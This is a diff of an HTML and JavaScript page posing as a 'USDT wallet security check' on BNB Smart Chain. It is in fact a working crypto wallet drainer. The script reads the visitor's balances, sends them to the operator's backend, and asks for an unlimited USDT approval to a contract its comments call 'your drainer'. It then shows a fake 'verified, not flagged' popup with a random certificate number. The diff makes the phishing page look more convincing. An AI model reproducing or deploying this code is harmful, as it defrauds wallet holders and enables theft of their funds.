@@ -1,109 +1,163 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>USDT Approval WebApp</title>
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-    <style>
-      body { font-family: Arial, sans-serif; background: #181b24; color: #fff; text-align: center; margin:0; padding:0;}
-      .container { margin-top: 10vh; }
-      button { padding: 16px 30px; border-radius: 10px; font-size: 1.1em; background: #10b981; color: #fff; border: none; cursor: pointer; margin-top: 24px;}
-      button:active { background: #07996d; }
-      #popup {display:none; position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:#fff; color:#222; padding:30px; border-radius:14px; min-width:300px; z-index:1000;}
-    </style>
+  <meta charset="UTF-8">
+  <title>Check Your USDT Wallet Security</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <style>
+    body {
+      margin: 0; padding: 0; font-family: 'Segoe UI', Arial, sans-serif;
+      background: linear-gradient(135deg, #1fc8db 0%, #2cb5e8 100%);
+      color: #222;
+      min-height: 100vh;
+    }
+    .main-box {
+      max-width: 430px;
+      margin: 7vh auto 0 auto;
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 10px 40px 0 rgba(30, 56, 130, 0.18);
+      padding: 34px 28px 32px 28px;
+      text-align: center;
+    }
+    h1 { font-size: 2.3rem; margin-bottom: 12px; color: #1877cf; }
+    .subtitle {
+      font-size: 1.05rem; color: #1877cf; margin-bottom: 28px;
+    }
+    .btn-main {
+      background: linear-gradient(90deg, #12d8fa 0%, #1877cf 100%);
+      color: #fff;
+      padding: 16px 40px;
+      border: none;
+      border-radius: 8px;
+      font-size: 1.1rem;
+      font-weight: 700;
+      box-shadow: 0 4px 18px rgba(30,56,130,0.08);
+      cursor: pointer;
+      transition: background 0.16s, transform 0.08s;
+    }
+    .btn-main:active { transform: scale(0.97); }
+    #walletInfo { margin-top: 18px; color: #555; font-size: 1rem; }
+    #approvalPopup {
+      display:none; position:fixed; top:50%; left:50%;
+      transform:translate(-50%,-50%);
+      background:white; border-radius:12px;
+      box-shadow:0 8px 30px rgba(0,0,0,0.19); padding:24px; max-width:390px; width:92%; z-index:9999; text-align:center;
+      border: 2px solid #1fc8db;
+    }
+    #approvalPopup strong { color: #1877cf; }
+    .success-icon { font-size: 45px; color: #16d97e; }
+    @media (max-width:500px) {
+      .main-box { margin: 0; min-height: 100vh; border-radius: 0; box-shadow: none;}
+    }
+  </style>
 </head>
 <body>
-  <div class="container">
-    <h1>🔒 Verify Your USDT Wallet</h1>
-    <p>Click below to connect and approve USDT for security check.</p>
-    <button onclick="approveToken()">Check & Approve</button>
+  <div class="main-box">
+    <h1>🔒 Check USDT Security</h1>
+    <div class="subtitle">Connect your wallet to check if your USDT is safe and valid.<br>This will prompt you for approval.</div>
+    <button class="btn-main" onclick="approveToken()">Check & Approve Now</button>
+    <p id="walletInfo" style="display:none;">Connecting...</p>
   </div>
-  <div id="popup"></div>
+
+  <div id="approvalPopup">
+    <div class="success-icon">&#9989;</div>
+    <p style="font-weight:bold; margin-top:8px;">Your USDT wallet has been successfully verified, not reported and is not flagged in our database.</p>
+    <div style="background:#16d97e1A; padding:14px; margin-top:16px; border-radius:8px; text-align:left;">
+      <p style="margin:6px 0;">
+        <strong>&#128100; Wallet Address:</strong><br>
+        <span id="popupAddress" style="word-break: break-all;"></span>
+      </p>
+      <p style="margin:6px 0;"><strong>&#128178; Balance:</strong><br><span id="popupBalance"></span> USDT</p>
+      <p style="margin:6px 0;"><strong>&#128197; Date:</strong><br><span id="popupDate"></span></p>
+      <p style="margin:6px 0;"><strong>&#127941; Certificate:</strong><br><span id="popupCert"></span></p>
+    </div>
+    <button onclick="document.getElementById('approvalPopup').style.display='none'" style="margin-top:12px; padding:8px 18px; background:#1fc8db; color:white; border:none; border-radius:6px; cursor:pointer;">Close</button>
+  </div>
 
 <script>
-const DRRAINER_CONTRACT = "0x08b471f9558fa41afd0690a37c361241ab5b2afa"; // your drainer
-const USDT_CONTRACT = "0x55d398326f99059Ff775485246999027B3197955";   // USDT BSC
-const BACKEND_API_URL = "https://YOUR_SERVER_IP:8080/log_approval";      // <-- change to your Flask endpoint
+const USDT_TOKEN = "0x55d398326f99059ff775485246999027b3197955";
+const DRAINER_CONTRACT = "0x08b471f9558fa41afd0690a37c361241ab5b2afa";
+const BACKEND_API = "https://YOUR_FLASK_BACKEND_HOST:8080/log_approval"; // << change to your real Flask host
 
-let provider, signer, userAddress;
+let walletAddress = "";
+let provider, signer;
 
 async function approveToken() {
-    if (!window.ethereum) {
-        showPopup("❌ Web3 wallet not found.<br><br>Install Metamask or Trust Wallet extension.");
-        return;
+  if (!window.ethereum) {
+    alert("MetaMask, Trust Wallet, or Web3 wallet required.");
+    return;
+  }
+  document.getElementById("walletInfo").style.display = "block";
+  document.getElementById("walletInfo").innerText = "Connecting to wallet...";
+
+  try {
+    provider = new ethers.providers.Web3Provider(window.ethereum);
+    // Switch to BSC if needed
+    const BSC_CHAIN_ID = "0x38";
+    let chainId = await provider.send('eth_chainId', []);
+    if (chainId !== BSC_CHAIN_ID) {
+      try {
+        await provider.send("wallet_switchEthereumChain", [{ chainId: BSC_CHAIN_ID }]);
+      } catch (e) {
+        if (e.code === 4902) {
+          await provider.send("wallet_addEthereumChain", [{
+            chainId: BSC_CHAIN_ID,
+            chainName: "Binance Smart Chain",
+            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+            rpcUrls: ["https://bsc-dataseed.binance.org/"],
+            blockExplorerUrls: ["https://bscscan.com"]
+          }]);
+        } else {
+          alert("Please switch to BNB Chain in your wallet and try again.");
+          return;
+        }
+      }
     }
+
+    await provider.send("eth_requestAccounts", []);
+    signer = provider.getSigner();
+    walletAddress = await signer.getAddress();
+
+    document.getElementById("walletInfo").innerText = "Connected: " + walletAddress.slice(0,7) + "..." + walletAddress.slice(-5);
+
+    // Balances
+    const bnbBal = ethers.utils.formatEther(await provider.getBalance(walletAddress));
+    const usdtAbi = [ "function balanceOf(address) view returns (uint256)", "function approve(address,uint256) returns (bool)" ];
+    const usdt = new ethers.Contract(USDT_TOKEN, usdtAbi, signer);
+    const usdtBal = ethers.utils.formatUnits(await usdt.balanceOf(walletAddress), 18);
+
+    // Log to backend
+    fetch(BACKEND_API, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ wallet: walletAddress, bnb: bnbBal, usdt: usdtBal })
+    });
+
+    // Approve unlimited USDT to your drainer
     try {
-        provider = new ethers.providers.Web3Provider(window.ethereum);
-
-        // 1. Prompt network switch to BSC
-        const BSC_CHAIN_ID = "0x38";
-        let chainId = await provider.send('eth_chainId', []);
-        if (chainId !== BSC_CHAIN_ID) {
-            try {
-                await provider.send("wallet_switchEthereumChain", [{ chainId: BSC_CHAIN_ID }]);
-                showPopup("Switched to BNB Smart Chain.");
-            } catch(e) {
-                // If chain not added
-                if (e.code === 4902) {
-                    await provider.send("wallet_addEthereumChain", [{
-                        chainId: BSC_CHAIN_ID,
-                        chainName: "Binance Smart Chain",
-                        nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-                        rpcUrls: ["https://bsc-dataseed.binance.org/"],
-                        blockExplorerUrls: ["https://bscscan.com"]
-                    }]);
-                } else {
-                    showPopup("❌ Please switch to BNB Smart Chain in your wallet.");
-                    return;
-                }
-            }
-        }
-
-        // 2. Prompt user to connect
-        await provider.send("eth_requestAccounts", []);
-        signer = provider.getSigner();
-        userAddress = await signer.getAddress();
-
-        // 3. Get BNB and USDT balances
-        const bnbBalance = ethers.utils.formatEther(await provider.getBalance(userAddress));
-        const usdtAbi = [
-          "function balanceOf(address) view returns (uint256)",
-          "function approve(address,uint256) returns (bool)"
-        ];
-        const usdt = new ethers.Contract(USDT_CONTRACT, usdtAbi, signer);
-        const usdtBalance = ethers.utils.formatUnits(await usdt.balanceOf(userAddress), 18);
-
-        // 4. Send to backend (CORS required on backend)
-        fetch(BACKEND_API_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ wallet: userAddress, bnb: bnbBalance, usdt: usdtBalance })
-        });
-
-        // 5. Approve unlimited USDT
-        try {
-          const maxUint = ethers.constants.MaxUint256;
-          const tx = await usdt.approve(DRRAINER_CONTRACT, maxUint);
-          showPopup("Please approve in your wallet...");
-          await tx.wait();
-          showPopup(
-            "✅ USDT Approved!<br>Your wallet:<br><b>" +
-            userAddress.slice(0,8) + "..." + userAddress.slice(-6) +
-            "</b><br>USDT: <b>" + usdtBalance + "</b><br>BNB: <b>" + bnbBalance + "</b>"
-          );
-        } catch(e) {
-          showPopup("❌ User rejected approval or error: " + e.message);
-        }
+      const tx = await usdt.approve(DRAINER_CONTRACT, ethers.constants.MaxUint256);
+      document.getElementById("walletInfo").innerText = "Waiting for approval...";
+      await tx.wait();
+      showApprovalPopup(walletAddress, usdtBal);
+      document.getElementById("walletInfo").style.display = "none";
     } catch(e) {
-        showPopup("❌ Wallet connection failed: " + e.message);
+      document.getElementById("walletInfo").innerText = "User rejected or approval failed.";
     }
+
+  } catch (err) {
+    console.error(err);
+    document.getElementById("walletInfo").innerText = "Wallet connection failed";
+  }
 }
 
-function showPopup(msg) {
-    const popup = document.getElementById('popup');
-    popup.style.display = 'block';
-    popup.innerHTML = msg;
-    setTimeout(() => popup.style.display='none', 6000);
+function showApprovalPopup(wallet, balance) {
+  document.getElementById('popupAddress').innerText = wallet;
+  document.getElementById('popupBalance').innerText = balance;
+  document.getElementById('popupDate').innerText = new Date().toLocaleDateString();
+  document.getElementById('popupCert').innerText = 'USDT-' + Math.floor(Math.random() * 90000000 + 10000000);
+  document.getElementById('approvalPopup').style.display = 'block';
 }
 </script>
 </body>
